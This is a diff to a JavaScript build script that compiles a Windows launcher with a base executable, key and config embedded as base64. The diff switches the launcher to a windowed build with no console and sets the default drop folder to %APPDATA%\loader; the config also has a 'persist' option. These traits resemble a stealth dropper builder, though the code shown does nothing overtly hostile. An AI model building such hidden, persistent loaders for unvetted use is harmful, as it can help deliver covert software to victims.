@@ -1,7 +1,8 @@
 // language: JavaScript, file: builder/compile.js
 // live-compiles the launcher per build. key + config + base baked in as C literals.
 // config fields honored: dest, exeName, keyFile, args[], persist.
-// if key is empty, the server generates one (caller passes the account key or a fresh gen).
+// windowed build — no console window.
+// default dest: %APPDATA%\loader
 
 import fs from 'node:fs';
 import path from 'node:path';
@@ -19,7 +20,7 @@ function clit(s) {
 
 function cSource({ keyB64, cfgB64, baseB64 }) {
   return `
-// auto-generated launcher — do not edit
+// auto-generated launcher — windowed, no console
 #include <windows.h>
 #include <shlobj.h>
 #include <stdio.h>
@@ -144,7 +145,10 @@ static void json_args(const char *json, char *out, size_t out_cap) {
     out[o] = 0;
 }
 
-int wmain(void) {
+// windowed entry — no console allocation
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
+    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
+
     DWORD key_len = 0, cfg_len = 0, base_len = 0;
     unsigned char *key  = b64decode(KEY_B64,  &key_len);
     unsigned char *cfg  = b64decode(CFG_B64,  &cfg_len);
@@ -155,7 +159,7 @@ int wmain(void) {
     DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
     memcpy(cfg_buf, cfg, copy);
 
-    char dest[1024]   = "%LOCALAPPDATA%\\\\yc";
+    char dest[1024]   = "%APPDATA%\\\\loader";
     char exeName[256] = "program.exe";
     char keyFile[256] = "key.json";
     char args[2048]   = "";
@@ -216,7 +220,6 @@ int wmain(void) {
 }
 
 export async function compileLauncher({ key, config, baseExe }) {
-  // no throw here — the route decides the fallback. key may be empty.
   const useKey  = (key && String(key).trim().length > 0) ? String(key).trim() : '';
 
   const keyB64  = Buffer.from(useKey, 'utf8').toString('base64');
@@ -231,7 +234,8 @@ export async function compileLauncher({ key, config, baseExe }) {
 
   try {
     await execFileP(CC, [
-      '-O2', '-s', '-municode',
+      '-O2', '-s',
+      '-mwindows',            // windowed subsystem — no console window
       '-o', outPath,
       srcPath,
       '-lshell32', '-ladvapi32',
